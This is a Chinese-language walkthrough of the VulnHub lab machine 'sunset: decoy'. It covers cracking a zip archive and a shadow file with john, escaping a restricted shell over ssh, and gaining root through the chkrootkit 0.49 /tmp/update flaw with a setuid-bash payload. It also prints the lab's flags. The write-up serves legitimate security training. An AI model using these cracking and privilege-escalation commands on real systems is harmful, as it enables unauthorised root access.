# sunset: decoy

2024-5-22 https://www.vulnhub.com/entry/sunset-decoy,505/

difficulty: Easy/Intermediate

## IP

192.168.5.30

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a9b53e3be374e4ffb6d59ff181e7a44f (RSA)
|   256 cef3b3e70e90e264ac8d870f1588aa5f (ECDSA)
|_  256 66a98091f3d84b0a69b000229f3c4c5a (ED25519)
80/tcp open  http    Apache httpd 2.4.38
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.0K  2020-07-07 16:36  save.zip
|_
|_http-server-header: Apache/2.4.38 (Debian)
```

http://192.168.5.30/ 有一个 save.zip 文件。

zip 文件是加密的，使用 john + rockyou 尝试进行爆破：

```
zip2john save.zip > hash
john hash --wordlist=~/tools/dict/rockyou.txt
```

得到解压码：manuel，对 zip 文件进行解压，进入目录，查看 passwd，发现 2 个可用用户：

```
cat passwd |grep bash
root:x:0:0:root:/root:/bin/bash
296640a3b825115a47b68fc44501c828:x:1000:1000:,,,:/home/296640a3b825115a47b68fc44501c828:/bin/rbash
```

再次使用 john + rockyou 对 shadow 进行解密：

```
john shadow --wordlist=~/tools/dict/rockyou.txt

server           (296640a3b825115a47b68fc44501c828)
```

得到用户 296640a3b825115a47b68fc44501c828 的密码:server

ssh 登陆后，发现有许多命令都不能使用：-rbash: sudo: command not found

应该是系统做了某些限制。

退出 ssh，重新连接，指定 bash 不加载 peofile，启动一个交互式 shell：

```
ssh 296640a3b825115a47b68fc44501c828@192.168.5.30 -t "bash --noprofile"
```

这时，得到了一个完整的交互式 shell，进行系统枚举，sudo、crontab、suid、cap 等都没发现特殊的程序。

读取到 user flag:

```
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /usr/bin/cat user.txt
35253d886842075b2c6390f35946e41f
```

honeypot.decoy 程序有一些检测功能：

```
1 Date.
2 Calendar.
3 Shutdown.
4 Reboot.
5 Launch an AV Scan.
6 Check /etc/passwd.
7 Leave a note.
8 Check all services status.
```

/usr/bin/strings honeypot.decoy 发现第 5 个选项会显示 The AV Scan will be launched in a minute or less.

然后对进程进行观察，发现启动了哪些程序或服务，发现 /bin/sh /root/chkrootkit-0.49/chkrootkit 一直在被调用。

这个版本的程序 chkrootkit-0.49 存在漏洞，https://www.exploit-db.com/exploits/33899

/tmp/update 中的内容会以 root 用户身份调用，可以将我们的利用代码写入到 /tmp/update 中：

```
echo '/usr/bin/cp /bin/bash /tmp/rootbash; /usr/bin/chmod +sx /tmp/rootbash' > /tmp/update && /usr/bin/chmod +x /tmp/update
```

过了一会，在/tmp 目录中，显示了 suid 权限的 rootbash，调用执行得到 root 权限：

```
rootbash-5.0# id
uid=1000(296640a3b825115a47b68fc44501c828) gid=1000(296640a3b825115a47b68fc44501c828) euid=0(root) egid=0(root) groups=0(root),1000(296640a3b825115a47b68fc44501c828)
rootbash-5.0# cd /root
rootbash-5.0# ls
chkrootkit-0.49  chkrootkit-0.49.tar.gz  log.txt  pspy	root.txt  script.sh
rootbash-5.0# cat root.txt
rootbash: cat: command not found
rootbash-5.0# /usr/bin/cat root.txt
  ........::::::::::::..           .......|...............::::::::........
     .:::::;;;;;;;;;;;:::::.... .     \   | ../....::::;;;;:::::.......
         .       ...........   / \\_   \  |  /     ......  .     ........./\
...:::../\\_  ......     ..._/'   \\\_  \###/   /\_    .../ \_.......   _//
.::::./   \\\ _   .../\    /'      \\\\#######//   \/\   //   \_   ....////
    _/      \\\\   _/ \\\ /  x       \\\\###////      \////     \__  _/////
  ./   x       \\\/     \/ x X           \//////                   \/////
 /     XxX     \\/         XxX X                                    ////   x
-----XxX-------------|-------XxX-----------*--------|---*-----|------------X--
       X        _X      *    X      **         **             x   **    *  X
      _X                    _X           x                *          x     X_


1c203242ab4b4509233ca210d50d2cc5

Thanks for playing! - Felipe Winsnes (@whitecr0wz)
```

/usr/bin/cat /var/spool/cron/crontabs/root 发现了以 root 身份每分钟定时执行的任务脚本：

```
* * * * * /bin/bash /root/script.sh

rootbash-5.0# /usr/bin/cat /root/script.sh
FILE=/dev/shm/STTY5246
if test -f "$FILE"; then
    /root/chkrootkit-0.49/chkrootkit
else
    echo "An AV scan will not be launched."
fi
```
